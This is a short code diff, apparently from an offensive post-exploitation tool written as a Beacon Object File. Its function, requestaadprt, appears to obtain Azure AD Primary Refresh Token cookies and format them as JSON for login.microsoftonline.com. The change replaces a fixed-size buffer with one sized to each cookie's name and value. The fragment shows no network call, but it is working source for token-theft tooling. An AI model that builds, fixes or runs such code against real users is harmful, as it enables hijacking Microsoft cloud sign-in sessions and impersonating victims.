@@ -84,12 +84,15 @@ int requestaadprt(LPCWSTR nonce) {
 		if (semicolonPos != NULL) {
 			*semicolonPos = L'\0';
 		}
-
-		wchar_t* cookieJson = (wchar_t*)MSVCRT$malloc(2048 * sizeof(wchar_t));
+		size_t nameLen = MSVCRT$wcslen(cookies[i].name);
+		size_t dataLen = MSVCRT$wcslen(cookies[i].data);
+		size_t neededSize = nameLen + dataLen + 256;
+		
+		wchar_t* cookieJson = (wchar_t*)MSVCRT$malloc(neededSize * sizeof(wchar_t));
 		
 		int written = MSVCRT$_snwprintf(
 			cookieJson,
-			2048,
+			neededSize,
 			L"{\"name\":\"%ls\",\"value\":\"%ls\",\"domain\":\"login.microsoftonline.com\",\"path\":\"/\",\"secure\":true,\"httpOnly\":true},",
 			cookies[i].name,
 			cookies[i].data
